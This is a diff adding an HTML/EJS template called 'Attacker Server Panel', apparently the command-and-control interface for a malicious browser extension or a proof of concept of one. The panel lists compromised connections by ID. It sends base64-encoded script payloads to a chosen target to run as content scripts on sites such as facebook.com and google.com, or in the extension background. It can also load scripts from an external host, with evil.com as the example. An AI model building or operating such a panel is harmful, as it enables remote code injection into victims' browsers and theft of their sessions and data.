@@ -1,0 +1,198 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css"
+          integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js"
+            integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN"
+            crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"
+            integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q"
+            crossorigin="anonymous"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"
+            integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl"
+            crossorigin="anonymous"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+
+    <title> Attacker Server Panel </title>
+</head>
+<body>
+
+<div class="container">
+    <h1> Attacker Server Panel </h1>
+
+    <h5> Current Active Connection </h5>
+    <table class="table table-dark">
+        <thead>
+        <tr>
+            <th scope="col"> Connection ID</th>
+            <th scope="col"> Is Online</th>
+        </tr>
+        </thead>
+        <tbody>
+        <% connections.forEach((value, key) => { %>
+            <tr>
+                <td> <%- key %>  </td>
+                <td> <%- !!connections.get(key) %>  </td>
+            </tr>
+        <% }) %>
+        </tbody>
+    </table>
+
+    <h5> Post to /executions </h5>
+
+    <form id="execution-form">
+        <div class="form-group">
+            <label for="targetId"> targetId </label>
+            <input id="targetId" type="text" class="form-control"
+                   placeholder="targetID: e.g. a1d7da06e5ca99a203dfb2f526df5ec4">
+        </div>
+        <div class="form-group">
+            <label for="type"> type </label>
+            <select class="form-control" id="type" name="type">
+                <option value="content" selected> content</option>
+                <option value="content-inline"> content-inline</option>
+                <option value="content-inline-event"> content-inline-event</option>
+                <option value="content-external"> content-external</option>
+                <option value="background"> background</option>
+                <option value="background-external"> background-external</option>
+            </select>
+        </div>
+        <div class="form-group" id="urls-groups">
+            <label for="urls"> urls to run on (only for content script) </label>
+            <input id="urls" type="text" class="form-control"
+                   placeholder="urls split with space e.g. https://www.facebook.com/ https://www.google.com/">
+        </div>
+        <div class="form-group" id="script-urls-groups" style="display: none;">
+          <label for="scriptUrl"> url for external script </label>
+          <input id="scriptUrl" type="text" class="form-control"
+                 placeholder="url to load a script from e.g. https://www.evil.com/myscript.js">
+      </div>
+        <div class="form-group">
+            <label for="script"> script payload </label>
+            <textarea id="script" name="script" class="form-control"></textarea>
+        </div>
+        <button type="submit" class="btn btn-primary"> Execute</button>
+    </form>
+
+</div>
+
+
+<script>
+  $(() => {
+    $("#type").change(() => {
+      if ($("#type").val().includes("content")) {
+        $("#urls-groups").show();
+      } else {
+        $("#urls-groups").hide();
+      }
+
+      if ($("#type").val().includes("external")) {
+        $("#script-urls-groups").show();
+      } else {
+        $("#script-urls-groups").hide();
+      }
+    });
+  });
+
+  function validateInput(body) {
+    const {targetId, payload} = body
+    const {type, script, urls, scriptUrl} = payload
+
+    if (!targetId) {
+      alert('targetId must be defined')
+      return false
+    }
+
+    let isValid = true
+    switch(type) {
+      case 'content':
+        if (!script) {
+          alert('script must be defined')
+          isValid = false
+        }
+        break;
+      case 'content-inline':
+        if (!script) {
+          alert('script must be defined')
+          isValid = false
+        }
+        break;
+      case 'content-external':
+        if (!scriptUrl) {
+          alert('scriptUrl must be defined')
+          isValid = false
+        }
+        break;
+      case 'background':
+        if (!script) {
+          alert('script must be defined')
+          isValid = false
+        }
+        break;
+      case 'background-external':
+        if (!scriptUrl) {
+          alert('scriptUrl must be defined')
+          isValid = false
+        }
+        break;
+      default:
+        isValid = false
+        alert(`Unsupported type=${type}`)
+    }
+    return isValid
+  }
+
+  document.getElementById("execution-form").onsubmit = (e) => {
+    e.preventDefault();
+
+    let type = $("#type").val();
+    let targetId = $("#targetId").val();
+    let script = $("#script").val();
+    let urls = $("#urls").val();
+    let scriptUrl = $("#scriptUrl").val();
+
+    
+
+    let base64script = btoa(script);
+
+    let urlArray = urls.split(/\s*[\s,]\s*/);
+
+    let body = {
+      targetId,
+      payload: {
+        type,
+        script: base64script,
+        urls, 
+        scriptUrl
+      }
+    };
+
+
+    if (!validateInput(body)) {
+      return;
+    }
+
+    fetch("/executions", {
+      method: "post",
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify(body)
+    }).then(res => {
+      alert(JSON.stringify(body) + " has been sent");
+    }).catch(err => {
+      alert(err);
+    });
+  };
+</script>
+
+</html>
